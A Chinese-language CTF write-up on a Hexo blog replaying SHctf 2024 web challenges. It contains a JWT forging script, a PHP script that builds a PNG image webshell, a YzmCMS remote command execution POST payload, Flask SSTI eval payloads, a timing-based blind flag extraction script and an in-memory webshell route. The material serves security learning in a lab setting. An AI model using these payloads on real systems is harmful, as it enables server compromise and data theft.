@@ -1,0 +1,601 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://odiws.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://odiws.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="Hexo" href="http://odiws.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="文件上传,MD5碰撞,jwt密码爆破,cms" />
+
+
+<link rel="canonical" href="http://odiws.github.io/2024/10/27/SHctf%E5%A4%8D%E7%8E%B02024/">
+
+
+
+  <title>
+SHctf-2024部分复现 - 比赛复现 |
+zty153’s_blog = Hexo</title>
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">SHctf-2024部分复现
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2024-10-27 18:58:26">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-10-27T18:58:26+08:00">2024-10-27</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">zty153’s_blog</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?239095"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?836236"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?860203"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?707865"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?649551"></li>
+          <li class="item" data-background-image="https://www.loliapi.com/acg/?104653"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" itemprop="item" rel="index" title="In 比赛复现"><span itemprop="name">比赛复现</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://odiws.github.io/2024/10/27/SHctf%E5%A4%8D%E7%8E%B02024/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="odiws">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="Hexo">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h2 id="shctf2024部分复现"><a class="anchor" href="#shctf2024部分复现">#</a> SHctf2024 部分复现：</h2>
+<h3 id="week2登陆验证"><a class="anchor" href="#week2登陆验证">#</a> week2：登陆验证</h3>
+<p>描述：</p>
+<pre><code>他们都说jwt不安全，那我拿个密钥加密不就行了，你又不知道密钥是多少。什么? 你说可以爆破出来? 666666!
+</code></pre>
+<p>登陆页面登录后：</p>
+<p>发现可疑 token：<a href="SHctf%B8%B4%CF%D62024.md">SHctf 复现 2024.md</a></p>
+<pre><code>token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3Mjg4Mzg3MzIsImlhdCI6MTcyODgzMTUzMiwibmJmIjoxNzI4ODMxNTMyLCJyb2xlIjoidXNlciJ9.VGA6D757VurbD0RD4CS16PZOQ6jYfVowaAVT87h3NCY
+</code></pre>
+<p><span class="exturl" data-url="aHR0cHM6Ly9qd3QuaW8vJUVGJUJDJTlB">https://jwt.io/：</span></p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202410271905750.png" alt="image-20241027190456071" /></p>
+<p>能看到 role 处是 user, 根据题目描述基本可以知道改为 admin 即可成为 &quot;真正的 admin&quot;</p>
+<p>但这个 token 的加密是有密钥的，根据题目描述 &quot;666666&quot; 得知要爆破 6 位，优先考虑弱口令</p>
+<p>用这个来 jwt 爆破</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xtYW1taW5vL2p3dC1jcmFja2Vy">https://github.com/lmammino/jwt-cracker</span></p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202410272015083.png" alt="image-20241027201523549" /></p>
+<p>基本就是这样的：获取密码，改东西上传就有 flag 了。</p>
+<p>脚本：</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> jwt</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># payload</span></pre></td></tr><tr><td data-num="3"></td><td><pre>token_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token string">"exp"</span><span class="token punctuation">:</span> <span class="token number">1729778616</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token string">"iat"</span><span class="token punctuation">:</span> <span class="token number">1729771416</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token string">"nbf"</span><span class="token punctuation">:</span> <span class="token number">1729771416</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token string">"alg"</span><span class="token punctuation">:</span> <span class="token string">"HS256"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token string">"typ"</span><span class="token punctuation">:</span> <span class="token string">"JWT"</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>jwt_token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>token_dict<span class="token punctuation">,</span>  <span class="token comment"># payload, 有效载体</span></pre></td></tr><tr><td data-num="14"></td><td><pre>                       <span class="token string">"222333"</span><span class="token punctuation">,</span>  <span class="token comment"># 进行加密签名的密钥</span></pre></td></tr><tr><td data-num="15"></td><td><pre>                       algorithm<span class="token operator">=</span><span class="token string">"none"</span><span class="token punctuation">,</span>  <span class="token comment"># 指明签名算法方式，默认也是 HS256</span></pre></td></tr><tr><td data-num="16"></td><td><pre>                       headers<span class="token operator">=</span>headers</pre></td></tr><tr><td data-num="17"></td><td><pre>                       <span class="token comment"># json web token 数据结构包含两部分，payload (有效载体), headers (标头)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>                       <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>jwt_token<span class="token punctuation">)</span></pre></td></tr></table></figure><h3 id="week2拜师之旅番外"><a class="anchor" href="#week2拜师之旅番外">#</a> week2：拜师之旅・番外</h3>
+<p>考查 PNG 文件上传二次渲染</p>
+<p>当上传一张图片成功后，查看图片可以发现是通过 GET 传文件路径来显示的，考虑存在 include 包含</p>
+<p>并且根据题目描述尝试下载图片回来对比会发现上传与下载的图片数据不一致，存在二次渲染</p>
+<p>此时需要构造一张不被渲染掉的 png 图片马，这里借用了网上的脚本</p>
+<pre><code>&lt;?php
+$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
+           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
+           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
+           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
+           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
+           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
+           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
+           0x66, 0x44, 0x50, 0x33);
+           
+$img = imagecreatetruecolor(32, 32);
+ 
+for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;
+   $r = $p[$y];
+   $g = $p[$y+1];
+   $b = $p[$y+2];
+   $color = imagecolorallocate($img, $r, $g, $b);
+   imagesetpixel($img, round($y / 3), 0, $color);
+&#125;
+ 
+imagepng($img,'1.png');  //要修改的图片的路径
+ 
+/* 木马内容
+&lt;?$_GET[0]($_POST[1]);?&gt;
+ */ 
+?&gt;
+</code></pre>
+<p>将构造好的图片马上传，并在查看图片页面进行命令执行</p>
+<p>GET ：靶机地址 /？image=/upload/293146324.png <code>&amp;0=system</code></p>
+<p>发布： <code>1=tac /f*</code></p>
+<p>执行一次后再重新下载图片回来即可得到回显</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202410272029901.png" alt="image-20241027202934731" /></p>
+<p>直接出了</p>
+<h3 id="week3-小小cms"><a class="anchor" href="#week3-小小cms">#</a> [Week3] 小小 cms:</h3>
+<p>YzmCMS 的 pay 接口调用了 db_pdo 类的 wheremethods 导致了远程命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统指令，写入后门文件，最终可获取服务器权限。YzmCMS 的 pay 接口调用了 db_pdo 类的 wheremethods 导致了远程命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统指令，写入后门文件，最终可获取服务器权限。</p>
+<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202410272033232.png" alt="image-20241027203357867" /></p>
+<p>POST:</p>
+<pre><code>out_trade_no[0]=eq&amp;out_trade_no[1]=cat /flag&amp;out_trade_no[2]=system
+</code></pre>
+<h3 id="week3love_flask"><a class="anchor" href="#week3love_flask">#</a> week3:<strong>love_flask</strong></h3>
+<p>源码：</p>
+<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">def</span> <span class="token function">pretty_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>html_template<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/namelist'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">def</span> <span class="token function">name_list</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>    template <span class="token operator">=</span> <span class="token string">'&lt;h1>Hi, %s.&lt;/h1>'</span> <span class="token operator">%</span> name</pre></td></tr><tr><td data-num="9"></td><td><pre>    rendered_string <span class="token operator">=</span>  render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">if</span> rendered_string<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">'Success Write your name to database'</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">return</span> <span class="token string">'Error'</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">if</span> </pre></td></tr><tr><td data-num="15"></td><td><pre>name</pre></td></tr><tr><td data-num="16"></td><td><pre> <span class="token operator">==</span> '</pre></td></tr><tr><td data-num="17"></td><td><pre>__main__</pre></td></tr><tr><td data-num="18"></td><td><pre>'<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>关键词：template     --------&gt;   sstI</p>
+<p>没有 return ， 但是没有任何的过滤</p>
+<p>但是不出网，不回显，做不了一点</p>
+<p>不回显可以反弹 shell，不出网不回显就不知道了，</p>
+<p>wp 有两种方法：</p>
+<p>一种是盲注，因为渲染失败会返回 500，所以可以先爆出 eval</p>
+<pre><code>/namelist?name=&#123;&#123;().__class__.__base__.__subclasses__()[&#123;&#123;int(100-200)&#125;&#125;].__init__.__globals__['__builtins__']['eval']('__import__(&quot;time&quot;).sleep(3)')&#125;&#125;
+</code></pre>
+<p><img data-src="https://mmbiz.qpic.cn/mmbiz_png/crOK73kjDuiaCYofiaN8P1yvfgjTKEPdNbVKOcpjncUfkP1gtcd2VVX4YzcIfZgQHibDsYByCicmu87UF6cQAYGNvA/640?wx_fmt=png&amp;from=appmsg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片" /></p>
+<p>接着通过构造延时来爆 flag</p>
+<pre><code>import requests
+import time
+flag ='SHCTF&#123;'
+table = '-ABCDEFabcdef0123456789'
+url = 'http://210.44.150.15:25528/namelist?name='
+for len in range(7,43):
+    for i in table:
+      ii = flag +i
+      start_time = time.time()
+      data = &quot;&#123;&#123;"+"().__class__.__base__.__subclasses__()[100].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"if [ $(head -c &#123;&#125; /flag) = &#123;&#125; ]; then sleep 2; fi\").read()')".format(len,ii) +"&#125;&#125;&quot;
+      #print(data)
+      url1 = url + data
+      r = requests.get(url1)
+      end_time = time.time()
+      response_time = end_time - start_time
+      if response_time &gt;= 2:
+          flag = flag +i
+          print(flag)
+      else:
+          continue
+print(flag+'&#125;')
+</code></pre>
+<p>第二种</p>
+<p>内存马</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTA5MzM/dGltZV9fMTMxMT1DcWp4UlFpUXFRcXFseEdnNlFHQ0RjbVFEODByZERDYkFlRA==">https://xz.aliyun.com/t/10933?time__1311=CqjxRQiQqQqqlxGg6QGCDcmQD80rdDCbAeD</span></p>
+<p>内存马无需上传文件也不生成文件。内存马通过动态注册一个路由来作为执行命令参数的入口。 <code>&#123;&#123;url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",&#123;'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']&#125;)&#125;&#125;</code></p>
+<p><img data-src="https://mmbiz.qpic.cn/mmbiz_png/crOK73kjDuiaCYofiaN8P1yvfgjTKEPdNbUUmZdib44GLJRFQC74xxXcC4vgnsMWwpEibich74wfnVr2uwGaXrTqRibQ/640?wx_fmt=png&amp;from=appmsg&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片" /></p>
+<p>内存马看了一下，出了最后两句，其他的还是很好理解的，就是新增了一个</p>
+<p>路由，进行了命令执行，很神奇</p>
+
+      <div class="tags">
+          <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag"><i class="ic i-tag"></i> 文件上传</a>
+          <a href="/tags/MD5%E7%A2%B0%E6%92%9E/" rel="tag"><i class="ic i-tag"></i> MD5碰撞</a>
+          <a href="/tags/jwt%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/" rel="tag"><i class="ic i-tag"></i> jwt密码爆破</a>
+          <a href="/tags/cms/" rel="tag"><i class="ic i-tag"></i> cms</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2024-10-28 19:00:24" itemprop="dateModified" datetime="2024-10-28T19:00:24+08:00">2024-10-28</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="odiws WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="odiws Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="odiws PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>odiws <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://odiws.github.io/2024/10/27/SHctf%E5%A4%8D%E7%8E%B02024/" title="SHctf-2024部分复现">http://odiws.github.io/2024/10/27/SHctf复现2024/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2024/10/23/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-include0%E3%80%820/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?679769" title="[NewStarCTF2023公开赛道]include0。0">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> 刷题笔记</span>
+  <h3>[NewStarCTF2023公开赛道]include0。0</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2024/10/28/newstarctf2024/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?908505" title="newstarctf2024">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> 比赛复现</span>
+  <h3>newstarctf2024</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#shctf2024%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text"> SHctf2024 部分复现：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#week2%E7%99%BB%E9%99%86%E9%AA%8C%E8%AF%81"><span class="toc-number">1.1.</span> <span class="toc-text"> week2：登陆验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week2%E6%8B%9C%E5%B8%88%E4%B9%8B%E6%97%85%E7%95%AA%E5%A4%96"><span class="toc-number">1.2.</span> <span class="toc-text"> week2：拜师之旅・番外</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week3-%E5%B0%8F%E5%B0%8Fcms"><span class="toc-number">1.3.</span> <span class="toc-text"> [Week3] 小小 cms:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#week3love_flask"><span class="toc-number">1.4.</span> <span class="toc-text"> week3:love_flask</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li class="active"><a href="/2024/10/27/SHctf%E5%A4%8D%E7%8E%B02024/" rel="bookmark" title="SHctf-2024部分复现">SHctf-2024部分复现</a></li><li><a href="/2024/10/28/newstarctf2024/" rel="bookmark" title="newstarctf2024">newstarctf2024</a></li><li><a href="/2024/12/10/%E5%9B%BD%E5%9F%8E%E6%9D%AF/" rel="bookmark" title="国城杯">国城杯</a></li><li><a href="/2025/02/24/vnctf%E5%A4%8D%E7%8E%B0/" rel="bookmark" title="vnctf复现">vnctf复现</a></li><li><a href="/2025/02/25/aliyunctf%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" rel="bookmark" title="aliyunctf部分复现">aliyunctf部分复现</a></li><li><a href="/2025/03/25/Nctf-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" rel="bookmark" title="Nctf_web部分复现">Nctf_web部分复现</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="odiws"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">odiws</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">97</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">11</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">87</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2024/10/23/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-include0%E3%80%820/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2024/10/28/newstarctf2024/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="In 学习笔记">学习笔记</a>
+</div>
+
+    <span><a href="/2025/03/28/rust%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="rust学习笔记">rust学习笔记</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/03/02/PWNHUB%E5%85%AC%E5%BC%80%E8%B5%9B2018-%E5%82%BBfufu-%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%97%A5/" title="[PWNHUB公开赛2018]傻fufu_的工作日">[PWNHUB公开赛2018]傻fufu_的工作日</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2025/02/09/BSidesCF2019-Sequel/" title="[BSidesCF2019]Sequel">[BSidesCF2019]Sequel</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/11/08/JMCTF2021-UploadHub/" title="[JMCTF2021]UploadHub">[JMCTF2021]UploadHub</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/ssti/" title="In ssti">ssti</a>
+</div>
+
+    <span><a href="/2024/10/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-notes/" title="[网鼎杯2020青龙组]notes">[网鼎杯2020青龙组]notes</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+</div>
+
+    <span><a href="/2024/11/04/%E6%96%87%E4%BB%B6%E9%87%8C%E7%9A%84%E7%A7%98%E5%AF%86/" title="文件里的秘密">文件里的秘密</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2025/05/21/sqltest/" title="sqltest">sqltest</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/05/29/ctf%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/" title="&#39;ctf工具总结&#39;">'ctf工具总结'</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/misc/" title="In misc">misc</a>
+</div>
+
+    <span><a href="/2025/05/06/MRCTF2020-ezmisc/" title="[MRCTF2020]ezmisc">[MRCTF2020]ezmisc</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/11/29/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/" title="[红明谷CTF-2021]EasyTP">[红明谷CTF-2021]EasyTP</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">odiws @ zty153’s_blog</span>
+  </div>
+  <div class="powered-by">
